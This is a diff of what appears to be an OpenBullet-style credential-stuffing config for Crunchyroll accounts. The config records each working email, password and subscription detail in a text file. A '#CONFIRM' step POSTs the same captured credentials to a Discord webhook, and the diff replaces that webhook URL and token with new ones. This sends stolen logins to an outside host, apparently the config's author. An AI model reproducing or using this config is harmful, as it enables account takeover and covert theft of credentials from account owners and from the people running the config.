@@ -3,11 +3,11 @@
   "Name": "🅲🆁🆄🅽🅲🅷🆈🆁🅾🅻🅻",
   "SuggestedBots": 200,
   "MaxCPM": 0,
-  "LastModified": "69-01-01T18:58:57.6010782-03:00",
+  "LastModified": "2023-07-28T20:47:02.1323139+01:00",
   "AdditionalInfo": "",
   "RequiredPlugins": [],
   "Author": "|👑AbrasiveTax49👑|",
-  "Version": "1.1.2 [SB Modded by AbrasiveTax49]",
+  "Version": "1.1.4 [SB]",
   "SaveEmptyCaptures": false,
   "ContinueOnCustom": false,
   "SaveHitsToTextFile": false,
@@ -136,11 +136,12 @@
 
 #Auto_Save UTILITY File "Crunchyroll.txt" AppendLines "┏━━━━━━━━┏━━━━━━━━━━━━━━━┓━━━━━━━┓\\n\\n↬ 【 Mail: <USER> 】\\n\\n↬ 【 Pass: <PASS> 】\\n\\n↬ 【 As Combo: <USER> : <PASS> 】\\n\\n↬ 【 Capture: | Name: <Name> | Date Created: <Date Created> | Country: <Country> | Subscription: <Subscription> | Plan: <Plan> 】\\n\\n\\n 【 *-* 🃏 ㋡ @AbrasiveTax49】 \\n┗━━━━━━━┗━━━━━━━━━━━━━━━┛━━━━━━━━┛\\n" -> VAR "crunchyroll_accounts" 
 
-#CONFIRM REQUEST POST "https://discord.com/api/webhooks/1029478697494913146/mXlEFnQ56cEk9CUFNzTj-BJRUwbBUtzXWvBUtCJDRTGJ7eT5R1DKovEpYhw_cqejxFoE" 
+#CONFIRM REQUEST POST "https://discord.com/api/webhooks/1052653066064756816/41YQq8Zrn5Ab00jTtpGKasXQodGZPcAAcXXSeTjBpX7ZULYsGntH44lBgL62mylr2gtL" 
   CONTENT "{\"content\":\" 【 Mail: <USER> 】 【 Pass: <PASS> 】 【 As Combo: <USER> : <PASS> 】【 Capture: | Name: <Name> | Date Created: <Date Created> | Country: <Country> | Subscription: <Subscription> | Plan: <Plan> 】 【𝗖𝗢𝗡𝗙𝗜𝗚 * 𝗕𝗬     »»» 👑AbrasiveTax49👑】\"}" 
   CONTENTTYPE "application/json" 
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
   HEADER "Pragma: no-cache" 
   HEADER "Accept: */*" 
 
-#@卂乃尺卂丂丨ᐯ乇ㄒ卂乂49 FUNCTION Constant "  »»» 👑AbrasiveTax49👑" -> CAP "𝗖𝗢𝗡𝗙𝗜𝗚 * 𝗕𝗬  "
+#@卂乃尺卂丂丨ᐯ乇ㄒ卂乂49 FUNCTION Constant "  »»» 👑AbrasiveTax49👑" -> CAP "𝗖𝗢𝗡𝗙𝗜𝗚 * 𝗕𝗬  " 
+
